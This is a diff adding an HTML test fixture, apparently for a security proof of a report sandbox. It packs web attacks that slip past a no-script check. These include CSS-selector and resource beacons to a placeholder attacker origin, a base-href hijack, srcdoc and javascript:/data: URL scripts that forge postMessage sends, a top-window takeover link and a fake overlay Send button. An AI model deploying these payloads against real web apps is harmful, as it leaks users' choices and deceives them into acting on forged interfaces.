@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Hostile report - published</title>
+<!-- A report that PASSES the Gateway's shape check (no script, no inline handler) and still attacks the
+     host with everything the check lets through. __EVIL__ is replaced by the proof with the origin of its
+     second server, which records every request it gets. Nothing below may reach the app, and no request
+     may reach __EVIL__ except the ones a click on a link deliberately causes. -->
+<base href="__EVIL__/base/">
+<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline'; img-src *; style-src *">
+<link rel="stylesheet" href="__EVIL__/beacon/link-stylesheet">
+<link rel="prefetch" href="__EVIL__/beacon/link-prefetch">
+<link rel="icon" href="__EVIL__/beacon/link-icon">
+<style>
+  @import url("__EVIL__/beacon/css-import");
+  @font-face { font-family: "exfil"; src: url("__EVIL__/beacon/css-font"); }
+  body { font-family: "exfil", sans-serif; background-image: url("__EVIL__/beacon/css-background"); }
+  /* Attribute-selector exfiltration: what the owner picks would load a different URL. */
+  input[value="tonight"]:checked { background-image: url("__EVIL__/beacon/css-checked-tonight"); }
+  input[value="monday"]:checked { background-image: url("__EVIL__/beacon/css-checked-monday"); }
+  textarea:focus { background-image: url("__EVIL__/beacon/css-focus"); }
+  /* Try to hide or cover the notes interface. */
+  [data-dev-report-ui], aside, button:not(#fake-send):not(#form-submit) { display: none !important; visibility: hidden !important; }
+  #fake-tray { position: fixed; right: 0; bottom: 0; z-index: 2147483647; background: #fff; border: 2px solid #c00; padding: 8px; }
+</style>
+</head>
+<body>
+<header data-dev-report="header" data-dev-report-status="waiting-on-you"><h1>Hostile report (published)</h1></header>
+<section data-dev-report="summary"><p>This report passes the shape check and attacks the host with what the check lets through.</p></section>
+<section data-dev-report="questions">
+  <div data-dev-report-question="pick" data-dev-report-question-text="Pick one">
+    <label><input type="radio" name="pick" value="tonight" data-recommended> Tonight</label>
+    <label><input id="pick-monday" type="radio" name="pick" value="monday"> Monday</label>
+  </div>
+</section>
+<section data-dev-report="detail" id="attacks">
+  <h2>Attacks</h2>
+  <p><img id="img-beacon" src="__EVIL__/beacon/img" alt="beacon"></p>
+  <p><img id="img-srcset" srcset="__EVIL__/beacon/img-srcset 1x" alt="srcset"></p>
+  <svg width="20" height="20"><image href="__EVIL__/beacon/svg-image" width="20" height="20"></image></svg>
+  <p><video id="video" src="__EVIL__/beacon/video" poster="__EVIL__/beacon/video-poster"></video></p>
+  <p><audio id="audio" src="__EVIL__/beacon/audio" autoplay></audio></p>
+  <object id="object" data="__EVIL__/beacon/object"></object>
+  <embed id="embed" src="__EVIL__/beacon/embed">
+  <iframe id="nested-src" src="__EVIL__/evil.html?from=nested-iframe"></iframe>
+  <iframe id="nested-srcdoc" srcdoc="&lt;script&gt;parent.postMessage({channel:'devthrottle.dev-report',version:1,type:'send',payload:{items:[{id:'s1',kind:'note',text:'FORGED BY SRCDOC',anchor:{type:'element',selector:'p',quote:''}}]}},'*');parent.parent.postMessage({channel:'devthrottle.dev-report',version:1,type:'send',payload:{items:[]}},'*');new Image().src='__EVIL__/beacon/srcdoc-script-ran';&lt;/script&gt;"></iframe>
+  <form id="form" action="__EVIL__/beacon/form" method="get"><input name="q" value="exfil"><button id="form-submit" type="submit">Submit form</button></form>
+  <p><a id="link-away" href="__EVIL__/evil.html?from=link">Read more (a plain link to another origin)</a></p>
+  <p><a id="link-js" href="javascript:parent.postMessage({channel:'devthrottle.dev-report',version:1,type:'send',payload:{items:[]}},'*');void(new Image().src='__EVIL__/beacon/javascript-url-ran')">A javascript: link</a></p>
+  <p><a id="link-data" href="data:text/html,%3Cp%3Edata%20page%3C%2Fp%3E%3Cscript%3Edocument.documentElement.setAttribute('data-data-url-script-ran'%2C'yes')%3Bnew%20Image().src%3D'__EVIL__/beacon/data-url-script-ran'%3Bparent.postMessage(%7Bchannel%3A'devthrottle.dev-report'%2Cversion%3A1%2Ctype%3A'ready'%2Cpayload%3A%7BquestionIds%3A%5B%5D%7D%7D%2C'*')%3C%2Fscript%3E">A data: link</a></p>
+  <p><a id="link-top" href="__EVIL__/evil.html?from=top" target="_top">Take over the app window (target _top)</a></p>
+  <p><a id="link-blank" href="__EVIL__/evil.html?from=blank" target="_blank">Open a popup (target _blank)</a></p>
+  <!-- Crafted as though a script DID run: a fake notes tray and a fake Send the owner might press. -->
+  <div id="fake-tray" data-drn="tray">
+    <textarea id="fake-composer" data-drn="composer-text">FORGED NOTE</textarea>
+    <button id="fake-send" type="button" data-drn="send">Send</button>
+  </div>
+</section>
+</body>
+</html>
